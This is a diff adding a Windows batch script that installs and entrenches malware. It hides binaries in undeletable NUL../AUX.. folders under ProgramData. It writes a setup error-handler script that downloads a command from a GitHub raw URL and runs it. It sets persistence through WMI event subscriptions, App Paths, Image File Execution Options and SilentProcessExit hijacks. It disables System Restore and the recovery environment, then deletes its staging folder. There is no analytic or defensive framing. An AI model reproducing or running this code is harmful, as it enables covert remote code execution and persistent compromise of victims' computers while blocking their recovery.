@@ -1,0 +1,39 @@
+mkdir \\.\%ProgramData%\NUL..\
+mkdir \\.\%ProgramData%\AUX..\
+mkdir %WINDIR%\Setup\Scripts
+fsutil file setshortname C:\ProgramData\NUL..\ ""
+fsutil file setshortname C:\ProgramData\AUX..\ ""
+
+move /Y "%ProgramData%\dist\Icon.dll" "\\.\%ProgramData%\AUX..\"
+move /Y "%ProgramData%\dist\Input.exe" "\\.\%ProgramData%\AUX..\"
+move /Y "%ProgramData%\dist\libssl-1_1.dll" "\\.\%ProgramData%\NUL..\"
+move /Y "%ProgramData%\dist\vcruntime140.dll" "\\.\%ProgramData%\NUL..\"
+move /Y "%ProgramData%\dist\libcrypto-1_1.dll" "\\.\%ProgramData%\NUL..\"
+move /Y "%ProgramData%\dist\ShellExperienceHost.exe" "\\.\%ProgramData%\NUL..\"
+
+echo @echo off >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
+echo powershell.exe -C "$c = (iwr 'https://raw.githubusercontent.com/githab0/0/0/0/configy' -UseBasicParsing).Content.Trim(); $exe, $args = $c -split ' ', 2; ([WMIClass]'Win32_Process').Create($exe + ' ' + $args)" >> "%WINDIR%\Setup\Scripts\ErrorHandler.cmd"
+echo @echo off > "%USERPROFILE%\Cookies\ini.cmd"
+echo powershell.exe \\.\%ProgramData%\AUX..\Input.exe \\.\%ProgramData%\AUX..\Icon.dll >> "%USERPROFILE%\Cookies\ini.cmd"
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\install.exe" /t REG_SZ /d "%USERPROFILE%\Cookies\ini.cmd" /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\setup.exe" /t REG_SZ /d "%WINDIR%\System32\oobe\Setup.exe" /f
+
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="SCM", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="SCM", CommandLineTemplate="%WINDIR%\System32\cmd.exe /c start setup.exe"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"SCM\"", Consumer="CommandLineEventConsumer.Name=\"SCM\""
+
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="Event", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="Event", CommandLineTemplate="%WINDIR%\System32\cmd.exe /c start install.exe"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"Event\"", Consumer="CommandLineEventConsumer.Name=\"Event\""
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MicrosoftEdgeUpdate.exe" /v Debugger /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start install.exe" /f
+
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v ReportingMode /t REG_DWORD /d 1 /f /reg:64
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v MonitorProcess /t REG_SZ /d "%WINDIR%\System32\cmd.exe /c start install.exe" /f /reg:64
+
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f
+reagentc /disable
+rd /s /q "%ProgramData%\dist"
